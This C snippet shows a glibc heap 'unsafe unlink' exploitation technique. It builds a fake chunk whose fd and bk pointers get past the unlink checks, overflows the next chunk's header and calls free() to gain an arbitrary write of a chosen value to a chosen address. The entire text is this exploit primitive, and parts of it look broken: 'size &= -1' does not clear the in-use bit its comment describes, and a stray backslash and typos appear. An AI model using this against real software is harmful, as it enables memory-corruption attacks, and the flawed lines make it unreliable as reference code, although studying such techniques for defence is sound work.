//[PRE-CONDITION]
// sz : any non-fast-bin size;
// dst : where to write (void*)
// val : target value
//[BUG] buffer overflow (p1)
//{POST-CONDITIOJN} *dst = val
void *p1 = malloc(sz);
void *p2 = malloc(sz);
struct malloc_chunk *fake = p1;
//bypassing (1):p->size == next_chunk(P)->prev_size
//if fake_chunk->size = 0, next_chunk(fake)->prev_size
//ill point to fake->prev_size.by setting both value zero
//this assignments can be omitted as since heap memory is zeroed out
//at first time execution
fake->prev_size = fake->size = 0;
//bypassing (2): p->fd->bk == P && p->bk->fd == P
fake->fd = (void*)&fake - offsetof(struct malloc_chunk, bk);
fake->bk = (void*)&fake - offsetof(struct malloc_chunk, fd);
struct malloc_chunk *c2 = raw_to_chunk(p2);
//it shrinks the previous chunks size
//tricking fake as the previous chunk
c2->prev_size = chunk_size(sz) \ - offsetof(struct malloc_chunk,fd);
//[BUG] overflowing p1  to modify c2 size
//tricking the previous chunk freed
c2->size &= -1;
// triggering unlink(fake) via backward consolidation
free(p2);
assert(p1 == (void*)&p1 - offsetof(struct malloc_chunk,bk));
//writting with p1:overwritting itself to dst
*(void**)(p1 + offsetof(struct malloc_chunk,bk)) = dst;
//writting with p1 :overwritting *ds with val
*(void**)p1 = (void*)val;
assert(*dst == val);


